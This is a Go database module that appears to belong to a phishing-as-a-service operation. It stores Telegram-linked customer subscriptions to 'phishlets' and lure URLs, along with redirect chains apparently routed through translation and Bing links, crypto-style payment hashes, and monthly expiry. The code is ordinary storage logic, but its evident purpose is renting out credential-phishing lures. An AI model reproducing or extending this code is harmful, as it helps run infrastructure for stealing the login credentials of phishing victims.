package database

import (
	"encoding/json"
	"fmt"
	"time"

	"github.com/tidwall/buntdb"
)

const subscriptionTable = "subscription"

type Subscription struct {
	Id             int    `json:"id"`
	TelegramChatId int64  `json:"telegram_chat_id"`
	Username       string `json:"username"`
	Phishlet       string `json:"phishlet"`
	LureId         int    `json:"lure_id"`
	LureURL        string `json:"lure_url"`
	ChainTranslate string `json:"chain_translate"`
	ChainBing      string `json:"chain_bing"`
	ChainDirect    string `json:"chain_direct"`
	NotifyChatId   int64  `json:"notify_chat_id"`
	TxHash         string `json:"tx_hash"`
	Status         string `json:"status"` // "pending" | "active" | "expired"
	CreatedAt      int64  `json:"created_at"`
	ExpiresAt      int64  `json:"expires_at"`
}

func (d *Database) subscriptionInit() {
	d.db.CreateIndex(subscriptionTable, subscriptionTable+":*", buntdb.IndexJSON("id"))
}

func (d *Database) subscriptionKey(id int) string {
	return fmt.Sprintf("%s:%d", subscriptionTable, id)
}

func (d *Database) CreateSubscription(chatId int64, txHash, phishlet string) (*Subscription, error) {
	maxId := 0
	d.db.View(func(tx *buntdb.Tx) error {
		tx.Ascend(subscriptionTable, func(key, val string) bool {
			var s Subscription
			if json.Unmarshal([]byte(val), &s) == nil && s.Id > maxId {
				maxId = s.Id
			}
			return true
		})
		return nil
	})

	sub := &Subscription{
		Id:             maxId + 1,
		TelegramChatId: chatId,
		TxHash:         txHash,
		Phishlet:       phishlet,
		Status:         "pending",
		CreatedAt:      time.Now().UTC().Unix(),
	}

	b, err := json.Marshal(sub)
	if err != nil {
		return nil, err
	}
	err = d.db.Update(func(tx *buntdb.Tx) error {
		_, _, err := tx.Set(d.subscriptionKey(sub.Id), string(b), nil)
		return err
	})
	return sub, err
}

func (d *Database) ActivateSubscription(id int, username, lureURL, chainTranslate, chainBing, chainDirect string, lureId int) error {
	return d.db.Update(func(tx *buntdb.Tx) error {
		val, err := tx.Get(d.subscriptionKey(id))
		if err != nil {
			return fmt.Errorf("subscription %d not found", id)
		}
		var sub Subscription
		if err := json.Unmarshal([]byte(val), &sub); err != nil {
			return err
		}
		sub.Status = "active"
		sub.Username = username
		sub.LureId = lureId
		sub.LureURL = lureURL
		sub.ChainTranslate = chainTranslate
		sub.ChainBing = chainBing
		sub.ChainDirect = chainDirect
		sub.ExpiresAt = time.Now().UTC().AddDate(0, 1, 0).Unix()
		b, _ := json.Marshal(sub)
		_, _, err = tx.Set(d.subscriptionKey(id), string(b), nil)
		return err
	})
}

func (d *Database) SetSubscriptionNotify(id int, notifyChatId int64) error {
	return d.db.Update(func(tx *buntdb.Tx) error {
		val, err := tx.Get(d.subscriptionKey(id))
		if err != nil {
			return err
		}
		var sub Subscription
		if err := json.Unmarshal([]byte(val), &sub); err != nil {
			return err
		}
		sub.NotifyChatId = notifyChatId
		b, _ := json.Marshal(sub)
		_, _, err = tx.Set(d.subscriptionKey(id), string(b), nil)
		return err
	})
}

func (d *Database) GetSubscription(id int) (*Subscription, error) {
	var sub Subscription
	err := d.db.View(func(tx *buntdb.Tx) error {
		val, err := tx.Get(d.subscriptionKey(id))
		if err != nil {
			return fmt.Errorf("subscription %d not found", id)
		}
		return json.Unmarshal([]byte(val), &sub)
	})
	return &sub, err
}

func (d *Database) GetSubscriptionByChatId(chatId int64) (*Subscription, error) {
	var found *Subscription
	d.db.View(func(tx *buntdb.Tx) error {
		tx.Ascend(subscriptionTable, func(key, val string) bool {
			var s Subscription
			if json.Unmarshal([]byte(val), &s) == nil && s.TelegramChatId == chatId {
				cp := s
				found = &cp
				return false
			}
			return true
		})
		return nil
	})
	if found == nil {
		return nil, fmt.Errorf("no subscription for chat %d", chatId)
	}
	return found, nil
}

func (d *Database) GetSubscriptionByLureId(lureId int) (*Subscription, error) {
	var found *Subscription
	d.db.View(func(tx *buntdb.Tx) error {
		tx.Ascend(subscriptionTable, func(key, val string) bool {
			var s Subscription
			if json.Unmarshal([]byte(val), &s) == nil && s.LureId == lureId && s.Status == "active" {
				cp := s
				found = &cp
				return false
			}
			return true
		})
		return nil
	})
	if found == nil {
		return nil, fmt.Errorf("no subscription for lure %d", lureId)
	}
	return found, nil
}

func (d *Database) ListSubscriptions() ([]*Subscription, error) {
	var subs []*Subscription
	d.db.View(func(tx *buntdb.Tx) error {
		tx.Ascend(subscriptionTable, func(key, val string) bool {
			var s Subscription
			if json.Unmarshal([]byte(val), &s) == nil {
				cp := s
				subs = append(subs, &cp)
			}
			return true
		})
		return nil
	})
	return subs, nil
}

func (d *Database) DeleteSubscription(id int) error {
	return d.db.Update(func(tx *buntdb.Tx) error {
		_, err := tx.Delete(d.subscriptionKey(id))
		return err
	})
}

func (d *Database) ExpireOldSubscriptions() ([]*Subscription, error) {
	subs, err := d.ListSubscriptions()
	if err != nil {
		return nil, err
	}
	now := time.Now().UTC().Unix()
	var expired []*Subscription
	for _, s := range subs {
		if s.Status == "active" && s.ExpiresAt > 0 && now > s.ExpiresAt {
			s.Status = "expired"
			b, _ := json.Marshal(s)
			d.db.Update(func(tx *buntdb.Tx) error {
				_, _, err := tx.Set(d.subscriptionKey(s.Id), string(b), nil)
				return err
			})
			expired = append(expired, s)
		}
	}
	return expired, nil
}
